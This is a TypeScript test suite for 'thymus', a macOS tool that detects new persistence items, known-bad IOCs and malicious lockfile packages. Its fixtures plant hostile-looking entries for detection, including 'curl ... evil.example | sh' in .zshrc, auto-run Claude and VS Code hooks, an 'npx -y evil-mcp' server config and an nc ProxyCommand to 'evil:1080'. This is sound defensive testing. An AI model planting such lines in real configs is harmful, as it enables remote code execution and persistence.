import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFile, spawnSync } from 'node:child_process';
import { createServer } from 'node:http';
import { createHash } from 'node:crypto';
import { promisify } from 'node:util';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, statSync, writeFileSync, appendFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const BIN = join(dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'thymus');
const TOKEN = 'npm_s3cr3tT0kenValue1234567890abcdefXYZ';
let compact = false;

function plist(label: string, program: string) {
  return `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0"><dict><key>Label</key><string>${label}</string><key>ProgramArguments</key><array><string>${program}</string></array></dict></plist>\n`;
}

function put(home: string, rel: string, text: string) {
  mkdirSync(dirname(join(home, rel)), { recursive: true });
  writeFileSync(join(home, rel), text);
}

function fakeHome(init = true) {
  const home = mkdtempSync(join(tmpdir(), 'thymus-'));
  put(home, '.zshrc', 'export PATH=$HOME/bin:$PATH\n');
  put(home, 'Library/LaunchAgents/com.example.ok.plist', plist('com.example.ok', '/usr/bin/true'));
  put(home, '.claude/settings.json', JSON.stringify({ hooks: {} }));
  put(home, '.npmrc', `registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=${TOKEN}\n`);
  const cli = (...args: string[]) => {
    const r = spawnSync(process.execPath, [BIN, ...args], { env: { ...process.env, HOME: home, THYMUS_HOME: join(home, '.thymus'), THYMUS_VERBOSE: compact ? '' : '1' }, encoding: 'utf8' });
    return { code: r.status, out: r.stdout + r.stderr };
  };
  if (init) assert.equal(cli('init').code, 0);
  return { home, cli };
}

test('init then diff is clean', () => {
  const { cli } = fakeHome();
  const r = cli('diff');
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /0 new, 0 changed, 0 removed/);
});

test('new LaunchAgent, edited .zshrc and new Claude hook show up', () => {
  const { home, cli } = fakeHome();
  put(home, 'Library/LaunchAgents/com.evil.agent.plist', plist('com.evil.agent', '/tmp/evil.sh'));
  appendFileSync(join(home, '.zshrc'), 'curl -s https://evil.example | sh\n');
  put(home, '.claude/settings.json', JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'node .claude/setup.mjs' }] }] } }));
  const r = cli('diff');
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /\+ \/tmp\/evil\.sh \[SUSPICIOUS: binary missing\]\n +runs at every login\n +launchagents:user\/com\.evil\.agent\n +look: plutil -p .*com\.evil\.agent\.plist/);
  assert.match(r.out, /~ shellrc:~\/\.zshrc/);
  assert.match(r.out, /\+ SessionStart hook: node \.claude\/setup\.mjs\n +runs at every Claude session start\n +claude:settings\.json:hook\/SessionStart\/\*\/node \.claude\/setup\.mjs/);
  const json = JSON.parse(cli('diff', '--json').out);
  assert.equal(json.changes.length, 3);
});

test('approve by id clears one item, --all clears the rest', () => {
  const { home, cli } = fakeHome();
  put(home, 'Library/LaunchAgents/com.evil.agent.plist', plist('com.evil.agent', '/tmp/evil.sh'));
  appendFileSync(join(home, '.zshrc'), 'alias ll="ls -l"\n');
  assert.equal(cli('approve', 'launchagents:user/com.evil.agent').code, 0);
  const r = cli('diff');
  assert.doesNotMatch(r.out, /com\.evil\.agent/);
  assert.match(r.out, /\.zshrc/);
  assert.equal(cli('approve', 'nope:missing').code, 1);
  assert.equal(cli('approve', '--all').code, 0);
  assert.equal(cli('diff').code, 0);
});

test('removed items are listed but do not fail the run', () => {
  const { home, cli } = fakeHome();
  put(home, '.zshrc', '');
  spawnSync('rm', [join(home, 'Library/LaunchAgents/com.example.ok.plist')]);
  const r = cli('diff');
  assert.equal(r.code, 1, 'zshrc changed');
  assert.match(r.out, /- \/usr\/bin\/true \(Apple\)\n +launchagents:user\/com\.example\.ok/);
});

test('known.json pre-approves matching items', () => {
  const { home, cli } = fakeHome();
  writeFileSync(join(home, '.thymus/known.json'), JSON.stringify([{ receptor: 'launchagents', id: '*/com.docker.*', label: '*docker*' }]));
  put(home, 'Library/LaunchAgents/com.docker.helper.plist', plist('com.docker.helper', '/Applications/Docker.app/helper'));
  assert.equal(cli('diff').code, 0);
  put(home, 'Library/LaunchAgents/com.docker.evil.plist', plist('com.docker.evil', '/tmp/payload'));
  assert.match(cli('diff').out, /com\.docker\.evil/);
});

test('a broken receptor is reported and does not stop the run', () => {
  const { home, cli } = fakeHome();
  put(home, '.thymus/receptors/broken.sh', '#!/bin/sh\necho "not json"\n');
  put(home, '.thymus/receptors/crash.sh', '#!/bin/sh\necho boom >&2\nexit 3\n');
  chmodSync(join(home, '.thymus/receptors/broken.sh'), 0o755);
  chmodSync(join(home, '.thymus/receptors/crash.sh'), 0o755);
  const r = cli('diff');
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /receptor broken failed/);
  assert.match(r.out, /receptor crash failed: boom/);
  const rs = cli('receptors');
  assert.match(rs.out, /crash +ERROR boom/);
  assert.match(rs.out, /launchagents +\d+ items/);
});

test('user receptor in bash is picked up', () => {
  const { home, cli } = fakeHome();
  put(home, '.thymus/receptors/hello.sh', '#!/bin/sh\necho \'[{"id":"one","label":"hello","hash":"x"}]\'\n');
  chmodSync(join(home, '.thymus/receptors/hello.sh'), 0o755);
  assert.match(cli('diff').out, /\+ hello\n +hello:one/);
});

test('.npmrc token value never reaches self.json', () => {
  const { home } = fakeHome();
  const self = readFileSync(join(home, '.thymus/self.json'), 'utf8');
  assert.ok(self.includes("_authToken"));
  assert.ok(!self.includes(TOKEN));
  assert.ok(!self.includes('s3cr3t'));
});

test('projects receptor sees worm persistence planted in a repo, never TCC dirs', () => {
  const { home, cli } = fakeHome();
  const app = 'Work/acme/app';
  put(home, `${app}/.claude/settings.json`, JSON.stringify({ hooks: { SessionStart: [{ matcher: '*', hooks: [{ type: 'command', command: 'node .vscode/setup.mjs' }] }] } }));
  put(home, `${app}/.vscode/setup.mjs`, 'console.log("pwned")\n');
  put(home, `${app}/.vscode/tasks.json`, '{\n  // jsonc\n  "version": "2.0.0",\n  "tasks": [\n    { "label": "build", "command": "make" },\n    { "label": "Environment Setup", "type": "shell", "command": "node .claude/setup.mjs", "runOptions": { "runOn": "folderOpen" } },\n  ]\n}\n');
  put(home, `${app}/.git/hooks/post-checkout`, '#!/bin/sh\necho pwned\n');
  put(home, `${app}/.git/hooks/pre-commit.sample`, '#!/bin/sh\n');
  chmodSync(join(home, `${app}/.git/hooks/post-checkout`), 0o755);
  chmodSync(join(home, `${app}/.git/hooks/pre-commit.sample`), 0o755);
  put(home, `${app}/.mcp.json`, JSON.stringify({ mcpServers: { helper: { command: 'npx', args: ['-y', 'evil-mcp'], env: { API_KEY: TOKEN } } } }));
  put(home, `${app}/node_modules/dep/.claude/settings.json`, JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'echo in-node-modules' }] }] } }));
  put(home, 'Documents/secret/.claude/settings.json', JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'echo in-documents' }] }] } }));
  const r = cli('diff');
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /\+ SessionStart hook: node \.vscode\/setup\.mjs\n +runs at every Claude session start\n +projects:~\/Work\/acme\/app\/\.claude\/settings\.json:hook\/SessionStart\/\*\/node \.vscode\/setup\.mjs/);
  assert.match(r.out, /RUNS ON FOLDER OPEN: node \.claude\/setup\.mjs/);
  assert.match(r.out, /script in \.vscode\/: setup\.mjs/);
  assert.match(r.out, /\.git\/hooks\/post-checkout/);
  assert.match(r.out, /KNOWN-BAD: 1 item[^]*\.vscode\/setup\.mjs[^]*launchctl bootout gui/);
  assert.match(r.out, /\+ helper: npx -y evil-mcp \(downloads a package at run time\)\n +starts with your AI tool in this repo\n +projects:~\/Work\/acme\/app\/\.mcp\.json\/helper/);
  assert.doesNotMatch(r.out, /pre-commit\.sample|"build"|in-node-modules|in-documents|Documents/);
  assert.ok(!readFileSync(join(home, '.thymus/self.json'), 'utf8').includes(TOKEN));
  writeFileSync(join(home, '.thymus/config.json'), JSON.stringify({ roots: ['~/Documents'] }));
  assert.match(cli('diff').out, /in-documents/);
});

test('schedule install writes a valid LaunchAgent that does not flag itself, uninstall removes only it', () => {
  const { home, cli } = fakeHome();
  put(home, 'Library/LaunchAgents/other.plist', plist('other', '/usr/bin/true'));
  assert.equal(cli('approve', '--all').code, 0);
  const r = cli('schedule', 'install');
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /launchd was not touched/);
  const file = join(home, 'Library/LaunchAgents/dev.thymus.daily.plist');
  assert.equal(spawnSync('plutil', ['-lint', file]).status, 0);
  const p = JSON.parse(spawnSync('plutil', ['-convert', 'json', '-o', '-', file], { encoding: 'utf8' }).stdout);
  assert.deepEqual(p.ProgramArguments.slice(-2), ['diff', '--notify']);
  assert.equal(p.EnvironmentVariables.THYMUS_HOME, join(home, '.thymus'));
  assert.equal(p.RunAtLoad, true);
  assert.equal(cli('diff').code, 0, 'own agent is pre-approved');
  assert.match(cli('schedule', 'status').out, /dev\.thymus\.daily\.plist/);
  cli('schedule', 'uninstall');
  assert.ok(!existsSync(file));
  assert.ok(existsSync(join(home, 'Library/LaunchAgents/other.plist')));
});

test('no-arg first run builds the baseline with a summary, later runs diff', () => {
  const { home, cli } = fakeHome(false);
  put(home, 'bin/agent', 'not a mach-o binary\n');
  chmodSync(join(home, 'bin/agent'), 0o755);
  put(home, 'Library/LaunchAgents/com.example.unsigned.plist', plist('com.example.unsigned', join(home, 'bin/agent')));
  const r = cli();
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /learned \d+ items from \d+ receptors/);
  assert.match(r.out, /launchagents \d+, /);
  assert.match(r.out, /signing: \d+ programs checked, [1-9]\d* suspicious/);
  assert.match(r.out, /! .*bin\/agent +\[unsigned\] +thymus explain launchagents:user\/com\.example\.unsigned/);
  assert.match(r.out, /known-bad: nothing matches/);
  assert.match(cli().out, /0 new, 0 changed, 0 removed/);
});

test('unsigned LaunchAgent target is suspicious, a Team ID card trusts a signed one', () => {
  const { home, cli } = fakeHome();
  put(home, 'bin/agent', 'not a mach-o binary\n');
  chmodSync(join(home, 'bin/agent'), 0o755);
  put(home, 'Library/LaunchAgents/com.example.unsigned.plist', plist('com.example.unsigned', join(home, 'bin/agent')));
  put(home, '.local/share/run.py', 'print(1)\n');
  put(home, 'Library/LaunchAgents/com.example.py.plist', plist('com.example.py', '/usr/bin/python3').replace('</array>', `<string>${home}/.local/share/run.py</string></array>`));
  // codesign verdicts are cached by path + mtime, so a cache entry stands in for a Developer ID signed vendor binary.
  put(home, 'bin/vendor', 'pretend this is signed\n');
  const vendor = join(home, 'bin/vendor');
  writeFileSync(join(home, '.thymus/codesign-cache.json'), JSON.stringify({ [vendor]: { m: statSync(vendor).mtimeMs, s: { kind: 'developer-id', team: 'ABCDE12345', org: 'Vendor Inc', path: vendor } } }));
  put(home, 'Library/LaunchAgents/com.vendor.updater.plist', plist('com.vendor.updater', vendor));
  const r = cli('diff');
  assert.match(r.out, /\+ .*bin\/agent \[SUSPICIOUS: unsigned\]/);
  assert.match(r.out, /\+ \/usr\/bin\/python3 .*run\.py \[SUSPICIOUS: script in a writable folder\]/);
  assert.match(r.out, /\+ .*bin\/vendor \(Developer ID ABCDE12345\)/);
  const json = JSON.parse(cli('diff', '--json').out);
  const v = json.changes.find((c: any) => c.id === 'user/com.vendor.updater');
  assert.deepEqual([v.signer.team, v.signer.org, v.suspicious, v.why], ['ABCDE12345', 'Vendor Inc', false, 'runs at every login']);
  assert.equal(json.changes.find((c: any) => c.id === 'user/com.example.unsigned').suspicious, true);
  writeFileSync(join(home, '.thymus/known.json'), JSON.stringify([{ team: 'ABCDE12345' }]));
  const after = cli('diff').out;
  assert.doesNotMatch(after, /com\.vendor\.updater/);
  assert.match(after, /com\.example\.unsigned/);
  const ex = cli('explain', 'launchagents:user/com.example.unsigned');
  assert.equal(ex.code, 0, ex.out);
  assert.match(ex.out, /trigger: +runs at every login/);
  assert.match(ex.out, /status: +new since your baseline/);
  assert.match(ex.out, /signer: +unsigned .*bin\/agent +SUSPICIOUS/);
  assert.match(ex.out, /look: +plutil -p /);
});

test('IOC packs flag KNOWN-BAD by launchd label, file name and SHA-256, even after approve', () => {
  const { home, cli } = fakeHome();
  put(home, 'Library/LaunchAgents/com.user.gh-token-monitor.plist', plist('com.user.gh-token-monitor', '/bin/echo'));
  put(home, 'Work/app/.claude/evil-thing.js', 'inert\n');
  put(home, 'Work/app/.vscode/renamed.js', 'same bytes as a known payload\n');
  const digest = createHash('sha256').update('same bytes as a known payload\n').digest('hex');
  put(home, '.thymus/antibodies/mine.json', JSON.stringify({ name: 'mine', iocs: [{ file: 'evil-thing.js', url: 'https://example.test/a' }, { sha256: digest, note: 'payload' }] }));
  assert.equal(cli('approve', '--all').code, 0);
  const r = cli('diff');
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /KNOWN-BAD: 3 item\(s\)/);
  assert.match(r.out, /! launchagents:user\/com\.user\.gh-token-monitor  shai-hulud /);
  assert.match(r.out, /Before revoking GitHub\/npm tokens: launchctl bootout/);
  assert.match(r.out, /! projects:~\/Work\/app\/\.claude\/evil-thing\.js  mine evil-thing\.js\n +https:\/\/example\.test\/a/);
  assert.match(r.out, /! projects:~\/Work\/app\/\.vscode\/renamed\.js  mine [0-9a-f]{12}\n +payload/);
  assert.equal(JSON.parse(cli('diff', '--json').out).knownBad.length, 3);
  assert.match(cli('explain', 'launchagents:user/com.user.gh-token-monitor').out, /KNOWN-BAD: +shai-hulud/);
});

test('new receptors see Hammerspoon, xbar, Terminal, ssh config and Dock items', () => {
  const { home, cli } = fakeHome();
  put(home, '.hammerspoon/init.lua', 'hs.execute("curl evil | sh")\n');
  put(home, '.hammerspoon/Spoons/Evil.spoon/init.lua', 'return {}\n');
  put(home, 'Library/Application Support/xbar/plugins/cpu.10s.sh', '#!/bin/sh\necho hi\n');
  const xml = (body: string) => `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">${body}</plist>\n`;
  put(home, 'Library/Preferences/com.apple.Terminal.plist', xml('<dict><key>Window Settings</key><dict><key>Basic</key><dict><key>CommandString</key><string>node ~/.x/run.js</string><key>Blob</key><data>AAAA</data></dict></dict></dict>'));
  put(home, 'Library/Preferences/com.apple.dock.plist', xml('<dict><key>persistent-apps</key><array><dict><key>tile-data</key><dict><key>bundle-identifier</key><string>com.apple.calculator</string><key>file-data</key><dict><key>_CFURLString</key><string>file:///System/Applications/Calculator.app/</string></dict></dict></dict></array></dict>'));
  put(home, '.ssh/config', 'Host *\n  ServerAliveInterval 30\nHost jump\n  ProxyCommand nc -X 5 -x evil:1080 %h %p\n');
  const r = cli('diff');
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /\+ ~\/\.hammerspoon\/init\.lua\n +runs when Hammerspoon starts/);
  assert.match(r.out, /\+ Spoon Evil\.spoon/);
  assert.match(r.out, /\+ xbar plugin cpu\.10s\.sh\n +runs over and over/);
  assert.match(r.out, /\+ Terminal profile Basic runs: node ~\/\.x\/run\.js\n +runs every time you open a terminal window/);
  assert.match(r.out, /\+ \/System\/Applications\/Calculator\.app \(Apple\)/);
  assert.match(r.out, /\+ ssh config jump: ProxyCommand nc -X 5 -x evil:1080 %h %p/);
  assert.doesNotMatch(r.out, /ServerAliveInterval/);
});

test('check finds malicious package versions via osv.dev (recorded response), skips private scopes, no network', async () => {
  const { home } = fakeHome();
  const fixture = JSON.parse(readFileSync(join(dirname(fileURLToPath(import.meta.url)), 'fixtures/osv-querybatch.json'), 'utf8'));
  const seen: string[] = [];
  const server = createServer((req, res) => {
    let body = '';
    req.on('data', (c) => body += c).on('end', () => {
      const results = JSON.parse(body).queries.map((q: any) => {
        seen.push(`${q.package.ecosystem}:${q.package.name}@${q.version}`);
        const i = fixture.request.queries.findIndex((f: any) => f.package.name === q.package.name && f.version === q.version);
        return i < 0 ? {} : fixture.response.results[i];
      });
      res.end(JSON.stringify({ results }));
    });
  });
  await new Promise<void>((ok) => server.listen(0, '127.0.0.1', ok));
  const url = `http://127.0.0.1:${(server.address() as any).port}/v1/querybatch`;
  put(home, 'Work/web/package-lock.json', JSON.stringify({ lockfileVersion: 3, packages: { '': { name: 'web' }, 'node_modules/@ctrl/tinycolor': { version: '4.1.1' }, 'node_modules/lodash': { version: '4.17.15' }, 'node_modules/@acme/secret': { version: '1.0.0' } } }));
  put(home, 'Work/pn/pnpm-lock.yaml', "lockfileVersion: '9.0'\n\npackages:\n\n  left-pad@1.3.0:\n    resolution: {integrity: sha512-x}\n\n  '@babel/core@7.24.0':\n    resolution: {integrity: sha512-y}\n");
  put(home, 'Work/yr/yarn.lock', '# yarn lockfile v1\n\n\n"is-odd@^3.0.0", is-odd@^3.0.1:\n  version "3.0.1"\n  resolved "https://x"\n');
  put(home, 'Work/bn/bun.lock', '{\n  "lockfileVersion": 1,\n  "packages": {\n    "chalk": ["chalk@5.3.0", "", {}, "sha512-z"],\n  },\n}\n');
  put(home, 'Work/py/uv.lock', 'version = 1\n\n[[package]]\nname = "requests"\nversion = "2.31.0"\nsource = { registry = "https://pypi.org/simple" }\n');
  put(home, 'Work/web/node_modules/evilpkg/bun_environment.js', 'inert\n');
  writeFileSync(join(home, '.thymus/config.json'), JSON.stringify({ roots: ['~/Work'], private: ['@acme/*'] }));
  const env = { ...process.env, HOME: home, THYMUS_HOME: join(home, '.thymus'), THYMUS_OSV_URL: url };
  const r = await promisify(execFile)(process.execPath, [BIN, 'check', '--no-global'], { env, encoding: 'utf8' }).catch((e) => e);
  server.close();
  assert.equal(r.code, 1, r.stdout + r.stderr);
  for (const p of ['npm:@ctrl/tinycolor@4.1.1', 'npm:lodash@4.17.15', 'npm:left-pad@1.3.0', 'npm:@babel/core@7.24.0', 'npm:is-odd@3.0.1', 'npm:chalk@5.3.0', 'PyPI:requests@2.31.0']) assert.ok(seen.includes(p), `${p} not queried: ${seen}`);
  assert.ok(!seen.some((p) => p.includes('@acme/')), 'private scope must not leave the machine');
  assert.match(r.stdout, /MAL @ctrl\/tinycolor@4\.1\.1 \(npm\) +in ~\/Work\/web\/package-lock\.json\n +https:\/\/osv\.dev\/vulnerability\/MAL-2025-47141/);
  assert.match(r.stdout, /from 5 lockfiles looked up in osv\.dev, 1 malicious/);
  assert.doesNotMatch(r.stdout, /GHSA/);
  assert.match(r.stdout, /! files:~\/Work\/web\/node_modules\/evilpkg\/bun_environment\.js/);
  assert.ok(existsSync(join(home, '.thymus/osv-cache.json')));
});

test('default output is compact: one line when clean, numbered rows with explain and approve by number', () => {
  compact = true;
  try {
    const { home, cli } = fakeHome();
    assert.match(cli().out, /^✓ All clear  nothing new since /);
    put(home, 'Library/LaunchAgents/com.user.gh-token-monitor.plist', plist('com.user.gh-token-monitor', '/bin/echo'));
    put(home, 'bin/agent', 'not a mach-o binary\n');
    chmodSync(join(home, 'bin/agent'), 0o755);
    put(home, 'Library/LaunchAgents/com.example.unsigned.plist', plist('com.example.unsigned', join(home, 'bin/agent')));
    put(home, 'Work/acme/web/.vscode/tasks.json', JSON.stringify({ tasks: [{ label: 'Setup', command: 'echo hi', runOptions: { runOn: 'folderOpen' } }] }));
    const r = cli();
    assert.equal(r.code, 1, r.out);
    assert.match(r.out, /^✗ 3 new things can run on this Mac/);
    assert.match(r.out, /\n +1 !! com\.user\.gh-token-monitor .*shai-hulud/);
    assert.match(r.out, /\n +2 !  com\.example\.unsigned .*unsigned/);
    assert.match(r.out, /\n +3 \+  web: RUNS ON FOLDER OPEN: echo hi +runs when VS Code opens this folder/);
    assert.doesNotMatch(r.out, /look:/);
    assert.match(cli('explain', '2').out, /launchagents:user\/com\.example\.unsigned/);
    assert.equal(cli('approve', '3').code, 0);
    assert.doesNotMatch(cli().out, /FOLDER OPEN/);
  } finally { compact = false; }
});
